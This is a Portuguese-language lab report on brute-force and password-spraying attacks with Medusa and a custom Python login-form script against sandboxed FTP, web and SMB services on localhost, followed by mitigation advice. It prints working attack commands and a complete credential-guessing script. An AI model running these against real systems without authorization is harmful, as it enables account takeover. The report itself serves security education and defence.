# Relatório Técnico: Análise de Ataques de Força Bruta com Medusa e Kali Linux

## 1. Introdução
Este relatório técnico detalha a execução e análise de ataques de força bruta contra diferentes serviços, utilizando o sistema operativo Kali Linux e a ferramenta Medusa. O objetivo é demonstrar a vulnerabilidade de sistemas a este tipo de ataque e a importância de implementar medidas de segurança robustas. Foram simulados ataques contra um servidor FTP, um formulário de login web e um serviço SMB (Server Message Block).

## 2. Ambiente de Simulação
O ambiente de simulação foi configurado num sandbox, replicando um cenário comum de rede com serviços vulneráveis. A infraestrutura incluiu:

*   **Kali Linux**: Utilizado como plataforma de ataque, contendo ferramentas como Medusa.
*   **Servidor FTP**: Implementado com `vsftpd` na máquina local (127.0.0.1). Foi configurado para permitir acesso anónimo e um utilizador de teste (`testuser`) com uma palavra-passe fraca (`password123`).
*   **Servidor Web com DVWA (Damn Vulnerable Web Application)**: Configurado com Apache, MySQL e PHP. O DVWA foi utilizado para simular um ambiente web vulnerável, e um formulário de login simples foi criado para o ataque de força bruta. As credenciais válidas para o formulário eram `admin:password`.
*   **Servidor SMB**: Implementado com Samba na máquina local (127.0.0.1). Foram criados utilizadores de teste (`user1`, `user2`, `admin`) com a mesma palavra-passe (`Password123`) para simular um cenário de password spraying.

## 3. Metodologia e Execução dos Ataques

### 3.1. Ataque de Força Bruta em FTP

#### 3.1.1. Configuração do Alvo
O servidor FTP (`vsftpd`) foi configurado para aceitar conexões e um utilizador de teste (`testuser`) foi criado com a palavra-passe `password123`. Além disso, foi criado um utilizador `user` com a mesma palavra-passe `password123` para simular múltiplas contas com senhas fracas.

#### 3.1.2. Preparação das Wordlists
Foram criadas duas wordlists:
*   `users.txt`: Continha os nomes de utilizador `testuser`, `admin` e `user`.
*   `passwords.txt`: Continha as palavras-passe `password123`, `123456` e `admin`.

#### 3.1.3. Execução do Ataque
O ataque foi executado utilizando a ferramenta Medusa com o seguinte comando:

```bash
medusa -h 127.0.0.1 -U users.txt -P passwords.txt -M ftp -O ftp_attack_log.txt
```

#### 3.1.4. Resultados
O Medusa identificou com sucesso as seguintes credenciais válidas:

| Utilizador | Palavra-passe |
|:-----------|:--------------|
| `testuser` | `password123` |
| `user`     | `password123` |

O log completo do ataque foi guardado em `ftp_attack_results.txt`.

### 3.2. Ataque de Força Bruta em Formulário Web

#### 3.2.1. Configuração do Alvo
Um servidor web Apache foi configurado com um formulário de login simples em `http://127.0.0.1/login.php`. As credenciais válidas eram `admin:password`.

#### 3.2.2. Preparação das Wordlists
Foram criadas duas wordlists:
*   `web_users.txt`: Continha os nomes de utilizador `admin`, `user` e `test`.
*   `web_passwords.txt`: Continha as palavras-passe `password`, `123456` e `admin123`.

#### 3.2.3. Execução do Ataque
Devido a problemas de compatibilidade com o módulo `web-form` do Medusa, foi desenvolvido um script Python (`web_bruteforce.py`) para realizar o ataque. O script envia requisições POST para o formulário de login e verifica a resposta do servidor para a string "Login bem-sucedido!".

```python
import requests

def brute_force_web_form(url, users_file, passwords_file):
    with open(users_file, 'r') as u_file:
        users = [line.strip() for line in u_file]
    with open(passwords_file, 'r') as p_file:
        passwords = [line.strip() for line in p_file]

    found_credentials = []
    for user in users:
        for password in passwords:
            data = {'username': user, 'password': password, 'Login': 'Login'}
            try:
                response = requests.post(url, data=data)
                if 'Login bem-sucedido!' in response.text:
                    print(f"[SUCCESS] User: {user}, Password: {password}")
                    found_credentials.append((user, password))
                else:
                    print(f"[FAIL] User: {user}, Password: {password}")
            except requests.exceptions.ConnectionError:
                print(f"[ERROR] Connection refused for {url}")
                return []
    return found_credentials

if __name__ == '__main__':
    target_url = 'http://127.0.0.1/login.php'
    users_file = 'web_users.txt'
    passwords_file = 'web_passwords.txt'

    print(f"[*] Starting web form brute-force attack on {target_url}")
    credentials = brute_force_web_form(target_url, users_file, passwords_file)
    if credentials:
        with open('web_attack_results.txt', 'w') as f:
            for user, password in credentials:
                f.write(f"[SUCCESS] User: {user}, Password: {password}\n")
        print("[*] Web form attack completed. Results saved to web_attack_results.txt")
    else:
        print("[*] No credentials found or an error occurred.")
```

#### 3.2.4. Resultados
O script Python identificou com sucesso as seguintes credenciais válidas:

| Utilizador | Palavra-passe |
|:-----------|:--------------|
| `admin`    | `password`    |

O log completo do ataque foi guardado em `web_attack_results.txt`.

### 3.3. Password Spraying em SMB

#### 3.3.1. Configuração do Alvo
Um servidor SMB foi configurado com Samba. Foram criados os utilizadores `user1`, `user2` e `admin` no sistema, e posteriormente adicionados ao Samba, todos com a mesma palavra-passe `Password123`.

#### 3.3.2. Preparação das Wordlists
Foram criadas duas wordlists:
*   `smb_users.txt`: Continha os nomes de utilizador `user1`, `user2` e `admin`.
*   `smb_password.txt`: Continha a palavra-passe `Password123`.

#### 3.3.3. Execução do Ataque
O ataque foi executado utilizando a ferramenta Medusa com o seguinte comando:

```bash
medusa -h 127.0.0.1 -U smb_users.txt -P smb_password.txt -M smbnt -O smb_attack_log.txt
```

#### 3.3.4. Resultados
O Medusa identificou as seguintes credenciais como válidas, embora tenha retornado um erro genérico na validação (`ERROR (0xFFFFFF:UNKNOWN_ERROR_CODE)`):

| Utilizador | Palavra-passe |
|:-----------|:--------------|
| `user1`    | `Password123` |
| `user2`    | `Password123` |
| `admin`    | `Password123` |

O log completo do ataque foi guardado em `smb_attack_results.txt`.

## 4. Medidas de Mitigação
Para proteger sistemas contra ataques de força bruta e password spraying, é crucial implementar uma combinação de medidas de segurança:

*   **Políticas de Palavra-passe Fortes**: Impor requisitos de complexidade, comprimento mínimo e rotação regular de palavras-passe. Isso dificulta a adivinhação e a quebra por força bruta.
*   **Bloqueio de Contas**: Configurar sistemas para bloquear contas após um número predefinido de tentativas de login falhadas. Isso impede ataques contínuos contra uma única conta.
*   **Limitação de Taxa (Rate Limiting)**: Limitar o número de tentativas de login permitidas por endereço IP ou por conta num determinado período. Isso retarda significativamente os ataques automatizados.
*   **Autenticação Multifator (MFA)**: Adicionar uma camada extra de segurança, exigindo um segundo fator de autenticação (e.g., código SMS, aplicação autenticadora). Mesmo que a palavra-passe seja comprometida, o acesso não será concedido.
*   **Monitorização e Alerta**: Implementar sistemas de monitorização de logs de autenticação para detetar padrões incomuns ou um grande volume de tentativas de login falhadas, gerando alertas para a equipa de segurança.
*   **CAPTCHA**: Utilizar CAPTCHAs em formulários de login para diferenciar utilizadores humanos de bots, dificultando a automação de ataques.
*   **Nomes de Utilizador Complexos**: Evitar o uso de nomes de utilizador comuns ou facilmente adivinháveis (e.g., `admin`, `guest`, `test`).
*   **Firewall de Aplicação Web (WAF)**: Implementar um WAF para detetar e bloquear tráfego malicioso, incluindo tentativas de força bruta em aplicações web.

## 5. Conclusão
Os ataques de força bruta e password spraying continuam a ser ameaças significativas à segurança de sistemas e aplicações. Este projeto demonstrou a facilidade com que estas técnicas podem ser executadas e a importância de adotar uma abordagem de segurança em camadas para proteger as credenciais dos utilizadores e os recursos do sistema. A implementação das medidas de mitigação sugeridas é fundamental para reduzir o risco de sucesso destes ataques.

## 6. Referências
*   [Kali Linux Official Site](https://www.kali.org/)
*   [Medusa Documentation](https://www.foofus.net/?page_id=10)
*   [Damn Vulnerable Web Application (DVWA)](https://dvwa.co.uk/)
*   [Samba Official Site](https://www.samba.org/)
